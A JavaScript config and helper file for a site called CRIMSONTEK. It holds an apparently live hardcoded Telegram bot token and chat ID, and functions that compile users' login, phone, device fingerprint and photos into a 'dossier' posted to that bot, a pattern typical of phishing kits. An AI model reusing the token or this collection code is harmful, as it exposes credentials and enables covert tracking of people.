/**
 * CRIMSONTEK — общие настройки бота (тот же бот, что и для биометрии).
 * Для продакшена токен лучше держать только на сервере.
 */
const CRIMSON_TG = {
  token: '8657121511:AAGfGVnM6YKvaDUGRQ9MwmmNO0P_4IS6gq0',
  chatId: '7616949660'
};

/**
 * Секрет владельца: публикация роликов/фото/GIF только после ввода на admin_media.html.
 * Обязательно смените на свой пароль (иначе любой, кто видит код, сможет войти).
 */
const CRIMSON_ADMIN_SECRET = 'CHANGE_ME_OWNER_KEY';

/**
 * Чат с нейросетью (OpenAI-совместимый API).
 * 1) Задайте apiKey здесь ИЛИ сохраните ключ на странице HUB (кнопка «СОХРАНИТЬ») — в localStorage.
 * 2) Groq (бесплатно): https://console.groq.com/keys — URL и модель ниже подходят.
 * 3) OpenAI: смените apiUrl на https://api.openai.com/v1/chat/completions и model на gpt-4o-mini
 */
const CRIMSON_AI = {
  apiUrl: 'https://api.groq.com/openai/v1/chat/completions',
  apiKey: '',
  model: 'llama-3.3-70b-versatile'
};

function crimsonGetAiKey() {
  const fromConfig = typeof CRIMSON_AI !== 'undefined' && CRIMSON_AI.apiKey && String(CRIMSON_AI.apiKey).trim();
  if (fromConfig) return String(CRIMSON_AI.apiKey).trim();
  return (localStorage.getItem('crimson_ai_key') || '').trim();
}

function crimsonFormatAiHtml(text) {
  return escapeHtml(String(text)).replace(/\n/g, '<br>');
}

/**
 * @param {Array<{role:string,content:string}>} messages
 * @returns {Promise<string>}
 */
async function crimsonAiChat(messages) {
  const key = crimsonGetAiKey();
  if (!key) {
    const e = new Error('NO_KEY');
    e.code = 'NO_KEY';
    throw e;
  }
  const res = await fetch(CRIMSON_AI.apiUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: 'Bearer ' + key
    },
    body: JSON.stringify({
      model: CRIMSON_AI.model,
      messages: messages,
      temperature: 0.65
    })
  });
  const raw = await res.text();
  let data;
  try {
    data = JSON.parse(raw);
  } catch (err) {
    throw new Error(raw.slice(0, 200) || String(res.status));
  }
  if (!res.ok) {
    const msg = (data.error && data.error.message) || raw.slice(0, 300) || res.status;
    throw new Error(msg);
  }
  const out =
    data.choices &&
    data.choices[0] &&
    data.choices[0].message &&
    data.choices[0].message.content;
  if (!out) throw new Error('ПУСТОЙ ОТВЕТ API');
  return out;
}

/** URL списка моделей (проверка ключа без расхода токенов чата) */
function crimsonAiModelsEndpoint() {
  const u = CRIMSON_AI.apiUrl;
  if (u.indexOf('/chat/completions') >= 0) {
    return u.replace(/\/chat\/completions\/?$/, '/models');
  }
  return u.replace(/\/v1\/[^/]+$/, '/models');
}

/**
 * Проверка API-ключа (GET /v1/models). При file:// может не сработать из-за CORS — это нормально.
 * @returns {Promise<{ok:boolean,code:string,text:string,detail:string}>}
 */
async function crimsonCheckAiKeyStatus() {
  const key = crimsonGetAiKey();
  if (!key) {
    return {
      ok: false,
      code: 'none',
      text: 'КЛЮЧ НЕ ЗАДАН',
      detail: 'Укажите ключ на HUB или CRIMSON_AI.apiKey в crimson-config.js'
    };
  }
  const fromConfig = typeof CRIMSON_AI !== 'undefined' && CRIMSON_AI.apiKey && String(CRIMSON_AI.apiKey).trim();
  const source = fromConfig ? 'конфиг' : 'localStorage';
  try {
    const r = await fetch(crimsonAiModelsEndpoint(), {
      method: 'GET',
      headers: { Authorization: 'Bearer ' + key }
    });
    if (r.ok) {
      return {
        ok: true,
        code: 'ok',
        text: 'API: СВЯЗЬ OK',
        detail: 'Ключ принят · источник: ' + source
      };
    }
    if (r.status === 401) {
      return { ok: false, code: '401', text: 'API: 401 НЕВЕРНЫЙ КЛЮЧ', detail: source };
    }
    const raw = await r.text();
    return {
      ok: false,
      code: 'http',
      text: 'API: ОШИБКА ' + r.status,
      detail: (raw || '').slice(0, 160)
    };
  } catch (e) {
    return {
      ok: false,
      code: 'network',
      text: 'API: ПРОВЕРКА НЕДОСТУПНА',
      detail: 'Откройте сайт через http://localhost (не file://) или проверьте сеть/CORS.'
    };
  }
}

function crimsonCollectMeta() {
  return {
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    lang: navigator.language,
    langs: (navigator.languages || []).join(', '),
    platform: navigator.platform || '',
    ua: navigator.userAgent,
    screen: typeof screen !== 'undefined' ? `${screen.width}x${screen.height}` : '',
    viewport: `${window.innerWidth}x${window.innerHeight}`,
    referrer: document.referrer || 'direct',
    online: navigator.onLine,
    time: new Date().toISOString()
  };
}

function crimsonFormatDossier(title, extra) {
  const m = crimsonCollectMeta();
  const lines = [
    `<b>${title}</b>`,
    '',
    `<b>Оператор:</b> ${extra.login || '—'}`,
    `<b>Телефон:</b> ${extra.phone || '—'}`,
    `<b>Событие:</b> ${extra.event || '—'}`,
    '',
    '<b>Устройство / сессия</b>',
    `• Время (UTC): ${m.time}`,
    `• Часовой пояс: ${m.tz}`,
    `• Язык: ${m.lang} (${m.langs})`,
    `• Платформа: ${m.platform}`,
    `• Экран: ${m.screen}`,
    `• Viewport: ${m.viewport}`,
    `• Онлайн: ${m.online}`,
    `• Referrer: ${m.referrer}`,
    '',
    `<b>User-Agent</b>`,
    `<code>${escapeHtml(m.ua).slice(0, 3500)}</code>`
  ];
  if (extra.note) lines.push('', '<b>Комментарий</b>', escapeHtml(extra.note));
  return lines.join('\n');
}

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

/** Отправка текста в Telegram (HTML) */
function crimsonSendTelegramHtml(text) {
  const fd = new FormData();
  fd.append('chat_id', CRIMSON_TG.chatId);
  fd.append('text', text);
  fd.append('parse_mode', 'HTML');
  fd.append('disable_web_page_preview', 'true');
  return fetch(`https://api.telegram.org/bot${CRIMSON_TG.token}/sendMessage`, {
    method: 'POST',
    body: fd
  }).catch(() => {});
}

/** Фото + подпись (multipart) */
function crimsonSendTelegramPhoto(blob, caption) {
  const fd = new FormData();
  fd.append('chat_id', CRIMSON_TG.chatId);
  fd.append('photo', blob, 'snap.jpg');
  fd.append('caption', caption.slice(0, 1024));
  return fetch(`https://api.telegram.org/bot${CRIMSON_TG.token}/sendPhoto`, {
    method: 'POST',
    body: fd
  });
}
